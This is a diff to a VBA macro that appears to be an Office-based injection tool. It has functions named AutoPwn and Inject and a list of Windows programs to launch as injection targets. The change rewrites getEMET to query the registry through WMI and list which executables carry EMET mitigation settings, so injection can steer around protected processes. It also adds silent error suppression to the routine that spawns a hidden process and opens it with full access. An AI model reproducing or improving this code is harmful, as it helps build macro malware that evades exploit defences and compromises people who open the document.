@@ -68,7 +68,6 @@ Dim myList As String
 myList = ""
 myList = myList & "ping.exe /t 127.0.0.1" & ","
 myList = myList & "hh.exe /?" & ","
-myList = myList & "xwizard.exe" & ","
 myList = myList & "regedit.exe" & ","
 myList = myList & "cmd.exe /K" & ","
 myList = myList & "xpsrchvw.exe" & ","
@@ -100,35 +99,19 @@ getList = list
 End Function
 Public Function getEMET() As String()
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-tempDir = objShell.ExpandEnvironmentStrings("%TEMP%") & "\"
-oldCmd = "reg query ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"""
-useCmd = oldCmd & " > """ & tempDir & "emetPos.txt"""
-A = objShell.Run(useCmd, 0, True)
+Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv")
+oReg.EnumKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", arrSubKeys
 Dim sArray() As String
-Dim index As Integer
-Set File = objFSO.OpenTextFile(tempDir & "emetPos.txt", 1)
-While Not File.AtEndOfStream
-strLine = Trim(File.ReadLine)
-If strLine <> "" Then 
-Set newShell = CreateObject("WScript.Shell")
-Set newFSO = CreateObject("Scripting.FileSystemObject")
-newCmd = "reg query """ & strLine & """" & " >> """ & tempDir & "emetMiti.txt"""
-A = newShell.Run(newCmd, 0, True)
-Set file2 = newFSO.OpenTextFile(tempDir & "emetMiti.txt", 1)
-While Not file2.AtEndOfStream
-newLine = Trim(file2.ReadLine)
-If newLine Like "*MitigationOptions*" Then
-smex = Split(strLine, "\")
-ReDim Preserve sArray(index)
-sArray(index) = LCase(smex(UBound(smex)))
-index = index + 1
+Dim Index As Integer
+Index = 0
+For Each strSubKey In arrSubKeys
+oReg.GetQWORDValue HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & strSubKey & "\", "MitigationOptions", dwValue
+If dwValue Then
+ReDim Preserve sArray(Index)
+sArray(Index) = LCase(strSubKey)
+Index = Index + 1
 End If
-Wend
-file2.Close
-End If
-Wend
-File.Close
+Next
 getEMET = sArray
 End Function
 Public Function AutoPwn() As Long
@@ -175,6 +158,7 @@ End Function
 Public Function Inject(processCmd As String) As Long
 Dim hProcess&, hThread&, lLinkToLibrary&, lSize&, hKernel&
 If IsOffice64Bit Then
+On Error Resume Next
 A = Shell(processCmd, 0)
 hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, A)
 Dim b64 As Boolean
